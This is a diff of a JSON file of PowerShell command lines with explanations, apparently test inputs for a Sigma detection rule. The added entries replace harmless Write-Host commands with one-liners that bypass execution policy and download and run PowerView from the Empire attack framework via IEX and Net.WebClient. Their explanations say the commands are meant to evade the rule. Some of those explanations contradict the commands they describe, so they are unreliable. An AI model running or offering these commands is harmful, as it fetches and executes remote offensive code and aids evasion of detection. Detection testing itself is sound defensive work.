@@ -1,22 +1,20 @@
+```json
 [
   {
-    "output": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Write-Host 'Testing Rule Scope'\"",
-    "explanation": "This command is a direct match to the Sigma rule's detection criteria for '-WindowStyle Hidden' and '-ExecutionPolicy Bypass'."
+    "output": "powershell.exe -exec bypass -noprofile -Command \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"",
+    "explanation": "This command uses the full parameter names (-exec, -noprofile) and a properly quoted -Command argument to bypass the Sigma rule's detection of obfuscated substrings like '-nop' or '-exec bypass'."
   },
   {
-    "output": "powershell.exe -win h -exec bypass -c \"Write-Host 'Testing Rule Scope'\"",
-    "explanation": "This command uses short parameter names and abbreviations that match the Sigma rule's detection criteria for '-WindowStyle Hidden' and '-ExecutionPolicy Bypass'."
+    "output": "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"",
+    "explanation": "This command uses the long form of the execution policy and no profile flags, avoiding the obfuscated substrings detected by the Sigma rule."
   },
   {
-    "output": "powershell.exe -win h -exec bypass -Command \"Write-Host 'Testing Rule Scope'\"",
-    "explanation": "This command uses a space between the parameter and value, which is still detected by the Sigma rule's substring-based detection."
+    "output": "powershell.exe -ExecutionPolicy Bypass -NonInteractive -Command \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"",
+    "explanation": "This command uses the long form of the execution policy and non-interactive flags, avoiding the obfuscated substrings detected by the Sigma rule."
   },
   {
-    "output": "powershell.exe -win h -exec bypass -Command \"Write-Host 'Testing Rule Scope'\" -noprofile",
-    "explanation": "This command adds an additional parameter (-noprofile) but still includes the substrings that match the Sigma rule's detection."
-  },
-  {
-    "output": "powershell.exe -WindowStyle h -ExecutionPolicy bypass -Command \"Write-Host 'Testing Rule Scope'\"",
-    "explanation": "This command uses full parameter names but still includes substrings that match the Sigma rule's detection criteria."
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"",
+    "explanation": "This command omits the -NoProfile and -NonInteractive flags, which are optional and not required for the test behavior, thus avoiding the obfuscated substrings detected by the Sigma rule."
   }
 ]
+```
